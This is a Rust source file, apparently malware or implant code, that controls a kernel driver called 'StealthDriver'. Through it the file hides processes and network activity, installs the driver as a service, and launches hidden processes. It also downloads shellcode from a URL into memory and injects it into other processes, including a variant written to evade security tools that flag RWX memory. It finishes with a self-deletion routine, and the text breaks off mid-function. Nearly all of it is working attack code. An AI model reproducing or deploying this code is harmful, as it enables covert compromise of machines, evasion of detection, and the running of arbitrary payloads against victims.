// kernel_driver.rs — Rust port of KernelDriver.cs
// Communicates with a Windows kernel driver via IOCTL for process/network hiding,
// driver service management, fileless injection, process hollowing, and self-deletion.

use std::collections::HashSet;
use std::sync::{Mutex, atomic::{AtomicBool, AtomicI32, Ordering}};
use std::time::Duration;
use std::path::Path;
use log::{info, warn, error};

// ==================== IOCTL Codes ====================
// Must match the kernel driver (driver.cpp)

#[allow(dead_code)]
const IOCTL_SET_PID: u32 = 0x222004;
#[allow(dead_code)]
const IOCTL_HIDE_NET: u32 = 0x222008;
#[allow(dead_code)]
const IOCTL_UNHIDE: u32 = 0x22200C;

#[allow(dead_code)]
const DEVICE_PATH: &str = r"\\.\StealthDriver";
#[allow(dead_code)]
const SERVICE_NAME: &str = "StealthDriver";
#[allow(dead_code)]
const DRIVER_FILE: &str = "StealthDriver.sys";

// ==================== State ====================

lazy_static::lazy_static! {
    static ref HIDDEN_PIDS: Mutex<HashSet<u32>> = Mutex::new(HashSet::new());
    static ref DRIVER_HANDLE: Mutex<Option<DriverHandle>> = Mutex::new(None);
    static ref IS_INITIALIZED: AtomicBool = AtomicBool::new(false);
    static ref RECONNECT_ATTEMPTS: AtomicI32 = AtomicI32::new(0);
}

const MAX_RECONNECT_ATTEMPTS: i32 = 3;
const RECONNECT_DELAY_MS: u64 = 500;

// Maximum payload size for remote downloads (100 MB)
#[allow(dead_code)]
const MAX_PAYLOAD_SIZE: u64 = 100 * 1024 * 1024;

// ==================== Driver Handle ====================

/// Opaque handle wrapper for the kernel driver device.
/// On Windows this wraps a real HANDLE obtained via CreateFileW.
#[cfg(target_os = "windows")]
struct DriverHandle {
    handle: winapi::um::winnt::HANDLE,
}

// SAFETY: HANDLE is only accessed through a Mutex, ensuring single-threaded access
#[cfg(target_os = "windows")]
unsafe impl Send for DriverHandle {}
#[cfg(target_os = "windows")]
unsafe impl Sync for DriverHandle {}

#[cfg(not(target_os = "windows"))]
struct DriverHandle {
    _phantom: (),
}

#[cfg(target_os = "windows")]
impl Drop for DriverHandle {
    fn drop(&mut self) {
        unsafe {
            winapi::um::handleapi::CloseHandle(self.handle);
        }
    }
}

// ==================== Windows Helper: wide string conversion ====================

/// Converts a &str to a null-terminated wide (UTF-16) string for Win32 W-suffix APIs.
#[cfg(target_os = "windows")]
fn to_wide(s: &str) -> Vec<u16> {
    use std::os::windows::ffi::OsStrExt;
    std::ffi::OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

// ==================== Driver State ====================

#[derive(Debug, Clone, PartialEq)]
pub enum DriverState {
    NotLoaded,
    Running,
    Stopped,
    Transitioning,
    DeviceOnly,
    Unknown,
}

impl std::fmt::Display for DriverState {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            DriverState::NotLoaded => write!(f, "NOT_LOADED"),
            DriverState::Running => write!(f, "RUNNING"),
            DriverState::Stopped => write!(f, "STOPPED"),
            DriverState::Transitioning => write!(f, "TRANSITIONING"),
            DriverState::DeviceOnly => write!(f, "DEVICE_ONLY"),
            DriverState::Unknown => write!(f, "UNKNOWN"),
        }
    }
}

// ==================== Public API ====================

pub struct KernelDriver;

impl KernelDriver {
    /// Checks if the kernel driver device is accessible by attempting to open
    /// the device path. Returns true if the device can be opened (driver is
    /// loaded and exposing its device object), false otherwise.
    ///
    /// NOTE: This checks device accessibility only. Use `get_driver_state()`
    /// for full service state information via the SCM.
    pub fn is_loaded() -> bool {
        #[cfg(target_os = "windows")]
        {
            let wide_path = to_wide(DEVICE_PATH);
            unsafe {
                let handle = winapi::um::fileapi::CreateFileW(
                    wide_path.as_ptr(),
                    winapi::um::winnt::GENERIC_READ | winapi::um::winnt::GENERIC_WRITE,
                    0,
                    std::ptr::null_mut(),
                    winapi::um::fileapi::OPEN_EXISTING,
                    0,
                    std::ptr::null_mut(),
                );
                if handle != winapi::um::handleapi::INVALID_HANDLE_VALUE {
                    winapi::um::handleapi::CloseHandle(handle);
                    true
                } else {
                    false
                }
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            false
        }
    }

    pub fn is_initialized() -> bool {
        IS_INITIALIZED.load(Ordering::Acquire)
    }

    pub fn reconnect_attempts() -> i32 {
        RECONNECT_ATTEMPTS.load(Ordering::Relaxed)
    }

    /// Closes the cached driver handle and resets initialization state.
    pub fn close() {
        let mut handle = DRIVER_HANDLE.lock().unwrap();
        *handle = None; // Drop triggers CloseHandle on Windows
        IS_INITIALIZED.store(false, Ordering::Release);
    }

    /// Reconnects to the driver with exponential backoff.
    /// Returns true if reconnection succeeded within the allowed attempts.
    pub fn reconnect(max_attempts: Option<i32>) -> bool {
        Self::close();
        let max = max_attempts.unwrap_or(MAX_RECONNECT_ATTEMPTS);

        for i in 0..max {
            if Self::open_driver().is_ok() {
                info!("Reconnected to driver on attempt {}", i + 1);
                return true;
            }
            RECONNECT_ATTEMPTS.store(i + 1, Ordering::Relaxed);
            let delay = RECONNECT_DELAY_MS * (1u64 << (i as u64));
            warn!("Reconnect attempt {} failed, retrying in {}ms", i + 1, delay);
            std::thread::sleep(Duration::from_millis(delay));
        }
        error!("Failed to reconnect after {} attempts", max);
        false
    }

    // ==================== Process Hiding ====================

    /// Tells the kernel driver to hide a specific PID via IOCTL.
    pub fn hide_pid(pid: u32) -> Result<(), String> {
        #[cfg(target_os = "windows")]
        {
            Self::ensure_initialized()?;
            Self::send_ioctl_u32(IOCTL_SET_PID, pid)?;
            HIDDEN_PIDS.lock().unwrap().insert(pid);
            info!("PID {} hidden via kernel driver", pid);
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = pid;
            Err("Kernel driver operations require Windows".to_string())
        }
    }

    /// Hides the current process.
    pub fn hide_self() -> Result<(), String> {
        Self::hide_pid(std::process::id())
    }

    /// Try to hide self; returns true on success.
    pub fn try_hide_self() -> bool {
        Self::hide_self().is_ok()
    }

    /// Hides multiple PIDs. Stops on the first failure.
    pub fn hide_multiple_pids(pids: &[u32]) -> Result<(), String> {
        for &pid in pids {
            Self::hide_pid(pid)?;
        }
        Ok(())
    }

    /// Hides a process by name. Returns the PID that was hidden.
    pub fn hide_by_name(process_name: &str) -> Result<u32, String> {
        let pid = find_process_by_name(process_name)
            .ok_or_else(|| format!("Process '{}' not found", process_name))?;
        Self::hide_pid(pid)?;
        Ok(pid)
    }

    /// Returns all currently tracked hidden PIDs.
    pub fn get_hidden_pids() -> Vec<u32> {
        HIDDEN_PIDS.lock().unwrap().iter().copied().collect()
    }

    // ==================== Network Hiding ====================

    /// Enables network hiding in the kernel driver via IOCTL.
    pub fn hide_network() -> Result<(), String> {
        #[cfg(target_os = "windows")]
        {
            Self::ensure_initialized()?;
            Self::send_ioctl_empty(IOCTL_HIDE_NET)?;
            info!("Network hiding activated");
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            Err("Network hiding requires Windows kernel driver".to_string())
        }
    }

    /// Disables all kernel-level hiding (process + network).
    pub fn unhide() -> Result<(), String> {
        #[cfg(target_os = "windows")]
        {
            Self::ensure_initialized()?;
            Self::send_ioctl_empty(IOCTL_UNHIDE)?;
            HIDDEN_PIDS.lock().unwrap().clear();
            info!("All hiding deactivated");
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            HIDDEN_PIDS.lock().unwrap().clear();
            Err("Unhide requires Windows kernel driver".to_string())
        }
    }

    pub fn try_unhide() -> bool {
        Self::unhide().is_ok()
    }

    /// Full stealth: hide self + network + children.
    pub fn activate_full_stealth() -> bool {
        let hide_result = Self::hide_self().is_ok();
        let net_result = Self::hide_network().is_ok();
        hide_result && net_result
    }

    // ==================== Driver Service Management ====================

    /// Installs and starts the kernel driver as a Windows service via the
    /// Service Control Manager (SCM). If the service already exists, it
    /// attempts to start it. After starting, opens a device handle.
    pub fn load_driver(sys_file_path: &str) -> Result<(), String> {
        if !Path::new(sys_file_path).exists() {
            return Err(format!("Driver file not found: {}", sys_file_path));
        }

        #[cfg(target_os = "windows")]
        {
            // Resolve to absolute path for the SCM
            let abs_path = std::fs::canonicalize(sys_file_path)
                .map_err(|e| format!("Failed to resolve driver path: {}", e))?;
            // Strip the \\?\ prefix that canonicalize adds on Windows —
            // the SCM does not accept extended-length path syntax.
            let abs_path_str = abs_path.to_string_lossy();
            let clean_path = abs_path_str.strip_prefix(r"\\?\").unwrap_or(&abs_path_str);

            let service_name_w = to_wide(SERVICE_NAME);
            let binary_path_w = to_wide(clean_path);

            unsafe {
                // --- Open the SCM ---
                let sc_manager = winapi::um::winsvc::OpenSCManagerW(
                    std::ptr::null(),
                    std::ptr::null(),
                    winapi::um::winsvc::SC_MANAGER_ALL_ACCESS,
                );
                if sc_manager.is_null() {
                    let err = winapi::um::errhandlingapi::GetLastError();
                    return Err(format!(
                        "OpenSCManager failed (error {}). Are you running as Administrator?",
                        err
                    ));
                }

                // --- Try to open an existing service first ---
                let mut service = winapi::um::winsvc::OpenServiceW(
                    sc_manager,
                    service_name_w.as_ptr(),
                    winapi::um::winsvc::SERVICE_ALL_ACCESS,
                );

                if service.is_null() {
                    // Service does not exist — create it
                    service = winapi::um::winsvc::CreateServiceW(
                        sc_manager,
                        service_name_w.as_ptr(),
                        service_name_w.as_ptr(), // display name
                        winapi::um::winsvc::SERVICE_ALL_ACCESS,
                        winapi::um::winnt::SERVICE_KERNEL_DRIVER,
                        0x00000003, // SERVICE_DEMAND_START
                        0x00000001, // SERVICE_ERROR_NORMAL
                        binary_path_w.as_ptr(),
                        std::ptr::null(),     // no load-order group
                        std::ptr::null_mut(), // no tag
                        std::ptr::null(),     // no dependencies
                        std::ptr::null(),     // LocalSystem account
                        std::ptr::null(),     // no password
                    );
                    if service.is_null() {
                        let err = winapi::um::errhandlingapi::GetLastError();
                        winapi::um::winsvc::CloseServiceHandle(sc_manager);
                        return Err(format!("CreateService failed: error {}", err));
                    }
                    info!("Driver service '{}' created", SERVICE_NAME);
                } else {
                    info!("Driver service '{}' already registered", SERVICE_NAME);
                }

                // --- Start the service ---
                if winapi::um::winsvc::StartServiceW(service, 0, std::ptr::null_mut()) == 0 {
                    let err = winapi::um::errhandlingapi::GetLastError();
                    const ERROR_SERVICE_ALREADY_RUNNING: u32 = 1056;
                    if err != ERROR_SERVICE_ALREADY_RUNNING {
                        winapi::um::winsvc::CloseServiceHandle(service);
                        winapi::um::winsvc::CloseServiceHandle(sc_manager);
                        return Err(format!("StartService failed: error {}", err));
                    }
                    info!("Driver service already running");
                } else {
                    info!("Driver service started successfully");
                }

                winapi::um::winsvc::CloseServiceHandle(service);
                winapi::um::winsvc::CloseServiceHandle(sc_manager);
            }

            // Open the device handle now that the driver is running
            Self::open_driver()?;
            info!("Driver loaded from: {}", clean_path);
            Ok(())
        }

        #[cfg(not(target_os = "windows"))]
        {
            Err("Driver loading requires Windows".to_string())
        }
    }

    /// Stops and removes the kernel driver service via the SCM.
    pub fn unload_driver() -> Result<(), String> {
        let _ = Self::try_unhide();
        Self::close();

        #[cfg(target_os = "windows")]
        {
            let service_name_w = to_wide(SERVICE_NAME);

            unsafe {
                let sc_manager = winapi::um::winsvc::OpenSCManagerW(
                    std::ptr::null(),
                    std::ptr::null(),
                    winapi::um::winsvc::SC_MANAGER_ALL_ACCESS,
                );
                if sc_manager.is_null() {
                    let err = winapi::um::errhandlingapi::GetLastError();
                    return Err(format!("OpenSCManager failed: error {}", err));
                }

                let service = winapi::um::winsvc::OpenServiceW(
                    sc_manager,
                    service_name_w.as_ptr(),
                    winapi::um::winsvc::SERVICE_ALL_ACCESS,
                );
                if service.is_null() {
                    let err = winapi::um::errhandlingapi::GetLastError();
                    winapi::um::winsvc::CloseServiceHandle(sc_manager);
                    const ERROR_SERVICE_DOES_NOT_EXIST: u32 = 1060;
                    if err == ERROR_SERVICE_DOES_NOT_EXIST {
                        info!("Driver service does not exist, nothing to unload");
                        return Ok(());
                    }
                    return Err(format!("OpenService failed: error {}", err));
                }

                // Stop the service
                let mut status: winapi::um::winsvc::SERVICE_STATUS = std::mem::zeroed();
                if winapi::um::winsvc::ControlService(
                    service,
                    winapi::um::winsvc::SERVICE_CONTROL_STOP,
                    &mut status,
                ) == 0
                {
                    let err = winapi::um::errhandlingapi::GetLastError();
                    const ERROR_SERVICE_NOT_ACTIVE: u32 = 1062;
                    if err != ERROR_SERVICE_NOT_ACTIVE {
                        warn!("ControlService(STOP) failed: error {}", err);
                    }
                } else {
                    info!("Driver service stopped");
                    // Give the driver a moment to finish its unload routine
                    std::thread::sleep(Duration::from_millis(200));
                }

                // Delete the service registration
                if winapi::um::winsvc::DeleteService(service) == 0 {
                    let err = winapi::um::errhandlingapi::GetLastError();
                    winapi::um::winsvc::CloseServiceHandle(service);
                    winapi::um::winsvc::CloseServiceHandle(sc_manager);
                    return Err(format!("DeleteService failed: error {}", err));
                }

                info!("Driver service '{}' deleted", SERVICE_NAME);
                winapi::um::winsvc::CloseServiceHandle(service);
                winapi::um::winsvc::CloseServiceHandle(sc_manager);
            }
            Ok(())
        }

        #[cfg(not(target_os = "windows"))]
        {
            Err("Driver unloading requires Windows".to_string())
        }
    }

    /// Returns the current driver state by querying the SCM.
    /// Falls back to device-accessibility check if the SCM query fails.
    pub fn get_driver_state() -> DriverState {
        #[cfg(target_os = "windows")]
        {
            let service_name_w = to_wide(SERVICE_NAME);

            unsafe {
                let sc_manager = winapi::um::winsvc::OpenSCManagerW(
                    std::ptr::null(),
                    std::ptr::null(),
                    0x0001, // SC_MANAGER_CONNECT
                );
                if sc_manager.is_null() {
                    return if Self::is_loaded() {
                        DriverState::DeviceOnly
                    } else {
                        DriverState::Unknown
                    };
                }

                let service = winapi::um::winsvc::OpenServiceW(
                    sc_manager,
                    service_name_w.as_ptr(),
                    0x0004, // SERVICE_QUERY_STATUS
                );
                if service.is_null() {
                    winapi::um::winsvc::CloseServiceHandle(sc_manager);
                    // Service not registered — maybe driver loaded outside SCM
                    return if Self::is_loaded() {
                        DriverState::DeviceOnly
                    } else {
                        DriverState::NotLoaded
                    };
                }

                let mut status: winapi::um::winsvc::SERVICE_STATUS = std::mem::zeroed();
                let result =
                    if winapi::um::winsvc::QueryServiceStatus(service, &mut status) != 0 {
                        match status.dwCurrentState {
                            0x00000004 => DriverState::Running,  // SERVICE_RUNNING
                            0x00000001 => DriverState::Stopped,  // SERVICE_STOPPED
                            0x00000002 // SERVICE_START_PENDING
                            | 0x00000003 // SERVICE_STOP_PENDING
                            | 0x00000005 // SERVICE_CONTINUE_PENDING
                            | 0x00000006 // SERVICE_PAUSE_PENDING
                                => DriverState::Transitioning,
                            _ => DriverState::Unknown,
                        }
                    } else {
                        DriverState::Unknown
                    };

                winapi::um::winsvc::CloseServiceHandle(service);
                winapi::um::winsvc::CloseServiceHandle(sc_manager);
                result
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            DriverState::NotLoaded
        }
    }

    /// Loads driver + activates full stealth in one call.
    pub fn initialize_and_hide(sys_file_path: Option<&str>) -> bool {
        if let Some(path) = sys_file_path {
            if !Self::is_loaded() {
                if let Err(e) = Self::load_driver(path) {
                    error!("Failed to load driver: {}", e);
                    return false;
                }
            }
        }
        if !Self::is_loaded() { return false; }
        Self::activate_full_stealth()
    }

    /// Full cleanup: unhide, close, unload.
    pub fn shutdown() {
        if let Err(e) = Self::unhide() {
            warn!("Unhide during shutdown failed: {}", e);
        }
        Self::close();
        if let Err(e) = Self::unload_driver() {
            warn!("Unload during shutdown failed: {}", e);
        }
    }

    // ==================== Process Spawning ====================

    /// Spawns a process and immediately hides it via the kernel driver.
    pub fn spawn_hidden(file_name: &str, arguments: &str) -> Result<u32, String> {
        let child = std::process::Command::new(file_name)
            .args(arguments.split_whitespace())
            .spawn()
            .map_err(|e| format!("Failed to start {}: {}", file_name, e))?;

        let pid = child.id();
        if let Err(e) = Self::hide_pid(pid) {
            warn!("Failed to hide spawned PID {}: {}", pid, e);
        }
        Ok(pid)
    }

    /// Spawns a hidden process, captures stdout/stderr with a timeout.
    /// Returns (pid, stdout, stderr). Kills the process if the timeout
    /// elapses before it exits.
    pub fn spawn_hidden_with_output(
        file_name: &str,
        arguments: &str,
        timeout_ms: u64,
    ) -> Result<(u32, String, String), String> {
        use std::io::Read;

        let mut child = std::process::Command::new(file_name)
            .args(arguments.split_whitespace())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .map_err(|e| format!("Failed to start {}: {}", file_name, e))?;

        let pid = child.id();
        if let Err(e) = Self::hide_pid(pid) {
            warn!("Failed to hide spawned PID {}: {}", pid, e);
        }

        // Read stdout/stderr in separate threads to avoid pipe deadlocks
        let stdout_pipe = child.stdout.take();
        let stderr_pipe = child.stderr.take();

        let stdout_thread = std::thread::spawn(move || {
            let mut buf = String::new();
            if let Some(mut pipe) = stdout_pipe {
                let _ = pipe.read_to_string(&mut buf);
            }
            buf
        });

        let stderr_thread = std::thread::spawn(move || {
            let mut buf = String::new();
            if let Some(mut pipe) = stderr_pipe {
                let _ = pipe.read_to_string(&mut buf);
            }
            buf
        });

        // Poll for process exit with timeout
        let start = std::time::Instant::now();
        let timeout = Duration::from_millis(timeout_ms);
        loop {
            match child.try_wait() {
                Ok(Some(_status)) => break,
                Ok(None) => {
                    if start.elapsed() >= timeout {
                        warn!("Process {} timed out after {}ms, killing", pid, timeout_ms);
                        let _ = child.kill();
                        let _ = child.wait(); // reap zombie
                        return Err(format!(
                            "Process '{}' (PID {}) timed out after {}ms",
                            file_name, pid, timeout_ms
                        ));
                    }
                    std::thread::sleep(Duration::from_millis(50));
                }
                Err(e) => {
                    let _ = child.kill();
                    return Err(format!("Error waiting for process: {}", e));
                }
            }
        }

        let stdout = stdout_thread.join().unwrap_or_default();
        let stderr = stderr_thread.join().unwrap_or_default();

        Ok((pid, stdout, stderr))
    }

    // ==================== Fileless Execution ====================

    /// Downloads payload from URL directly into memory.
    /// Validates the response status, enforces a size limit, and rejects
    /// empty bodies.
    pub async fn download_to_memory(url: &str) -> Result<Vec<u8>, String> {
        // Basic URL validation
        if !url.starts_with("http://") && !url.starts_with("https://") {
            return Err(format!("Invalid URL scheme (expected http/https): {}", url));
        }

        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(30))
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .redirect(reqwest::redirect::Policy::limited(5))
            .build()
            .map_err(|e| format!("Failed to build HTTP client: {}", e))?;

        let resp = client.get(url).send().await
            .map_err(|e| format!("HTTP request to {} failed: {}", url, e))?;

        // Validate HTTP status
        let status = resp.status();
        if !status.is_success() {
            return Err(format!("HTTP {} from {}", status, url));
        }

        // Check Content-Length before downloading to avoid OOM
        if let Some(content_length) = resp.content_length() {
            if content_length > MAX_PAYLOAD_SIZE {
                return Err(format!(
                    "Payload too large: {} bytes exceeds {} byte limit",
                    content_length, MAX_PAYLOAD_SIZE
                ));
            }
        }

        let bytes = resp.bytes().await
            .map_err(|e| format!("Failed to read response body: {}", e))?;

        if bytes.is_empty() {
            return Err("Server returned an empty response body".to_string());
        }

        if bytes.len() as u64 > MAX_PAYLOAD_SIZE {
            return Err(format!(
                "Downloaded payload ({} bytes) exceeds {} byte limit",
                bytes.len(), MAX_PAYLOAD_SIZE
            ));
        }

        info!("Downloaded {} bytes from {}", bytes.len(), url);
        Ok(bytes.to_vec())
    }

    /// Downloads shellcode and injects into target PID.
    pub async fn download_and_inject(url: &str, target_pid: u32, stealthy: bool) -> Result<(), String> {
        let shellcode = Self::download_to_memory(url).await?;

        #[cfg(target_os = "windows")]
        {
            if stealthy {
                Self::inject_shellcode_stealthy(target_pid, &shellcode)
            } else {
                Self::inject_shellcode(target_pid, &shellcode)
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            let _ = (target_pid, stealthy, shellcode);
            Err("Shellcode injection requires Windows".to_string())
        }
    }

    /// Injects raw shellcode into a remote process using VirtualAllocEx
    /// (PAGE_EXECUTE_READWRITE) + WriteProcessMemory + CreateRemoteThread.
    ///
    /// All handles and allocated memory are cleaned up on every error path.
    #[cfg(target_os = "windows")]
    pub fn inject_shellcode(target_pid: u32, shellcode: &[u8]) -> Result<(), String> {
        use std::ptr;
        if shellcode.is_empty() {
            return Err("Shellcode cannot be empty".to_string());
        }

        unsafe {
            // --- Open target process ---
            let h_process = winapi::um::processthreadsapi::OpenProcess(
                0x1F0FFF, // PROCESS_ALL_ACCESS
                0,
                target_pid,
            );
            if h_process.is_null() {
                let err = winapi::um::errhandlingapi::GetLastError();
                return Err(format!(
                    "OpenProcess failed for PID {} (error {}). Check privileges.",
                    target_pid, err
                ));
            }

            // --- Allocate RWX memory in target ---
            let remote_addr = winapi::um::memoryapi::VirtualAllocEx(
                h_process,
                ptr::null_mut(),
                shellcode.len(),
                0x3000, // MEM_COMMIT | MEM_RESERVE
                0x40,   // PAGE_EXECUTE_READWRITE
            );
            if remote_addr.is_null() {
                let err = winapi::um::errhandlingapi::GetLastError();
                winapi::um::handleapi::CloseHandle(h_process);
                return Err(format!("VirtualAllocEx failed: error {}", err));
            }

            // --- Write shellcode ---
            let mut written: usize = 0;
            let write_ok = winapi::um::memoryapi::WriteProcessMemory(
                h_process,
                remote_addr,
                shellcode.as_ptr() as *const _,
                shellcode.len(),
                &mut written,
            );
            if write_ok == 0 || written != shellcode.len() {
                let err = winapi::um::errhandlingapi::GetLastError();
                // Clean up allocated memory before returning
                winapi::um::memoryapi::VirtualFreeEx(
                    h_process, remote_addr, 0, 0x8000, // MEM_RELEASE
                );
                winapi::um::handleapi::CloseHandle(h_process);
                return Err(format!(
                    "WriteProcessMemory failed: error {} (wrote {}/{})",
                    err, written, shellcode.len()
                ));
            }

            // --- Create remote thread ---
            let mut thread_id = 0u32;
            let h_thread = winapi::um::processthreadsapi::CreateRemoteThread(
                h_process,
                ptr::null_mut(),
                0,
                Some(std::mem::transmute(remote_addr)),
                ptr::null_mut(),
                0,
                &mut thread_id,
            );
            if h_thread.is_null() {
                let err = winapi::um::errhandlingapi::GetLastError();
                winapi::um::memoryapi::VirtualFreeEx(
                    h_process, remote_addr, 0, 0x8000,
                );
                winapi::um::handleapi::CloseHandle(h_process);
                return Err(format!("CreateRemoteThread failed: error {}", err));
            }

            // Wait for the remote thread with a 30-second timeout
            winapi::um::synchapi::WaitForSingleObject(h_thread, 30_000);

            // --- Cleanup ---
            winapi::um::handleapi::CloseHandle(h_thread);
            winapi::um::handleapi::CloseHandle(h_process);

            let _ = Self::hide_pid(target_pid);
            info!("Shellcode injected into PID {}", target_pid);
            Ok(())
        }
    }

    /// Stealthy injection with W^X compliance:
    ///   1. Allocate remote memory as PAGE_READWRITE (writable, not executable)
    ///   2. Write shellcode into the allocation
    ///   3. Flip protection to PAGE_EXECUTE_READ (executable, not writable)
    ///   4. Create remote thread to execute
    ///
    /// This avoids ever having a memory region that is simultaneously
    /// writable and executable, which is less likely to trigger
    /// security tools that flag RWX allocations.
    #[cfg(target_os = "windows")]
    pub fn inject_shellcode_stealthy(target_pid: u32, shellcode: &[u8]) -> Result<(), String> {
        use std::ptr;
        if shellcode.is_empty() {
            return Err("Shellcode cannot be empty".to_string());
        }

        unsafe {
            let h_process = winapi::um::processthreadsapi::OpenProcess(
                0x1F0FFF, // PROCESS_ALL_ACCESS
                0,
                target_pid,
            );
            if h_process.is_null() {
                let err = winapi::um::errhandlingapi::GetLastError();
                return Err(format!(
                    "OpenProcess failed for PID {} (error {}). Check privileges.",
                    target_pid, err
                ));
            }

            // Step 1: Allocate as RW — NOT executable yet
            let remote_addr = winapi::um::memoryapi::VirtualAllocEx(
                h_process,
                ptr::null_mut(),
                shellcode.len(),
                0x3000, // MEM_COMMIT | MEM_RESERVE
                0x04,   // PAGE_READWRITE
            );
            if remote_addr.is_null() {
                let err = winapi::um::errhandlingapi::GetLastError();
                winapi::um::handleapi::CloseHandle(h_process);
                return Err(format!("VirtualAllocEx (RW) failed: error {}", err));
            }

            // Step 2: Write shellcode into writable region
            let mut written: usize = 0;
            let write_ok = winapi::um::memoryapi::WriteProcessMemory(
                h_process,
                remote_addr,
                shellcode.as_ptr() as *const _,
                shellcode.len(),
                &mut written,
            );
            if write_ok == 0 || written != shellcode.len() {
                let err = winapi::um::errhandlingapi::GetLastError();
                winapi::um::memoryapi::VirtualFreeEx(
                    h_process, remote_addr, 0, 0x8000,
                );
                winapi::um::handleapi::CloseHandle(h_process);
                return Err(format!(
                    "WriteProcessMemory failed: error {} (wrote {}/{})",
                    err, written, shellcode.len()
                ));
            }

            // Step 3: Flip RW → RX (no longer writable)
            let mut old_protect: u32 = 0;
            if winapi::um::memoryapi::VirtualProtectEx(
                h_process,
                remote_addr,
                shellcode.len(),
                0x20, // PAGE_EXECUTE_READ
                &mut old_protect,
            ) == 0
            {
                let err = winapi::um::errhandlingapi::GetLastError();
                winapi::um::memoryapi::VirtualFreeEx(
                    h_process, remote_addr, 0, 0x8000,
                );
                winapi::um::handleapi::CloseHandle(h_process);
                return Err(format!("VirtualProtectEx (RW→RX) failed: error {}", err));
            }

            // Step 4: Execute the shellcode
            let mut thread_id = 0u32;
            let h_thread = winapi::um::processthreadsapi::CreateRemoteThread(
                h_process,
                ptr::null_mut(),
                0,
                Some(std::mem::transmute(remote_addr)),
                ptr::null_mut(),
                0,
                &mut thread_id,
            );
            if h_thread.is_null() {
                let err = winapi::um::errhandlingapi::GetLastError();
                winapi::um::memoryapi::VirtualFreeEx(
                    h_process, remote_addr, 0, 0x8000,
                );
                winapi::um::handleapi::CloseHandle(h_process);
                return Err(format!("CreateRemoteThread failed: error {}", err));
            }

            winapi::um::synchapi::WaitForSingleObject(h_thread, 30_000);

            winapi::um::handleapi::CloseHandle(h_thread);
            winapi::um::handleapi::CloseHandle(h_process);

            let _ = Self::hide_pid(target_pid);
            info!("Shellcode injected (stealthy W^X) into PID {}", target_pid);
            Ok(())
        }
    }

    /// Self-deletion: schedules deletion of the running executable after a
    /// short delay, using a detached subprocess.
    ///
    /// Uses canonicalized paths and proper quoting to handle spaces and
    /// special characters in the executable path.
    pub fn delete_self() {
        #[cfg(target_os = "windows")]
        {
            if let Ok(exe) = std::env::current_exe() {
                if let Ok(canonical) = exe.canonicalize() {
                    let path_str = canonical.to_string_lossy();
                    // Strip the \\?\ prefix — cmd.exe doesn't handle it
                    let clean_path = path_str.strip_prefix(r"\\?\").unwrap_or(&path_str);
                    let cmd = format!(
                        "ping 127.0.0.1 -n 3 > nul & del /f /q \"{}\"",
                        clean_path
                    );
                    let _ = std::process::Command::new("cmd.exe")
                        .args(&["/c", &cmd])
                        .stdout(std::process::Stdio::null())
                        .stderr(std::process::Stdio::null())
                        .spawn();
                    info!("Self-deletion scheduled for: {}", clean_path);
                } else {
                    warn!("Failed to canonicalize executable path for self-deletion");
                }
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            if let Ok(exe) = std::env::current_exe() {
                if let Ok(canonical) = exe.canonicalize() {
                    // Use double-quotes to handle spaces/special chars in the path
                    let path_str = canonical.to_string_lossy();
                    let _ = std::process::Command::new("sh")
                        .args(&["-c", &format!("sleep 3 && rm -f \"{}\"", path_str)])
                        .stdout(std::process::Stdio::null())
                        .stderr(std::process::Stdio::null())
                        .spawn();
                    info!("Self-deletion scheduled for: {}", path_str);
                } else {
                    warn!("Failed to canonicalize executable path for self-deletion");
                }
            }
        }
    }

    /// Full exit: unhide all, close driver, schedule self-deletion, then exit.
    pub fn clean_exit(exit_code: i32) {
        if let Err(e) = Self::unhide() {
            warn!("Failed to unhide during clean_exit: {}", e);
        }
        Self::close();
        Self::delete_self();
        std::process::exit(exit_code);
    }

    // ==================== Internal Helpers ====================

    /// Ensures the driver handle is open, returning an error if not.
    #[allow(dead_code)]
    fn ensure_initialized() -> Result<(), String> {
        if !IS_INITIALIZED.load(Ordering::Acquire) {
            return Err("Driver not initialized — call open_driver() or load_driver() first".to_string());
        }
        Ok(())
    }

    /// Opens the device handle to the kernel driver via CreateFileW and caches
    /// it in the global DRIVER_HANDLE.
    fn open_driver() -> Result<(), String> {
        #[cfg(target_os = "windows")]
        {
            let wide_path = to_wide(DEVICE_PATH);

            let handle = unsafe {
                winapi::um::fileapi::CreateFileW(
                    wide_path.as_ptr(),
                    winapi::um::winnt::GENERIC_READ | winapi::um::winnt::GENERIC_WRITE,
                    0,
                    std::ptr::null_mut(),
                    winapi::um::fileapi::OPEN_EXISTING,
                    winapi::um::winnt::FILE_ATTRIBUTE_NORMAL,
                    std::ptr::null_mut(),
                )
            };

            if handle == winapi::um::handleapi::INVALID_HANDLE_VALUE {
                let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
                return Err(format!(
                    "Failed to open driver device '{}': error {}",
                    DEVICE_PATH, err
                ));
            }

            let mut driver_handle = DRIVER_HANDLE.lock().unwrap();
            *driver_handle = Some(DriverHandle { handle });
            IS_INITIALIZED.store(true, Ordering::Release);
            RECONNECT_ATTEMPTS.store(0, Ordering::Relaxed);
            info!("Driver device handle opened");
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            Err("Driver communication requires Windows".to_string())
        }
    }

    /// Sends an IOCTL with a u32 input value to the driver via DeviceIoControl.
    #[cfg(target_os = "windows")]
    fn send_ioctl_u32(ioctl_code: u32, value: u32) -> Result<(), String> {
        let handle_guard = DRIVER_HANDLE.lock().unwrap();
        let driver = handle_guard
            .as_ref()
            .ok_or_else(|| "Driver handle not open".to_string())?;

        let mut input = value;
        let mut bytes_returned: u32 = 0;

        let success = unsafe {
            winapi::um::ioapiset::DeviceIoControl(
                driver.handle,
                ioctl_code,
                &mut input as *mut u32 as *mut _,
                std::mem::size_of::<u32>() as u32,
                std::ptr::null_mut(),
                0,
                &mut bytes_returned,
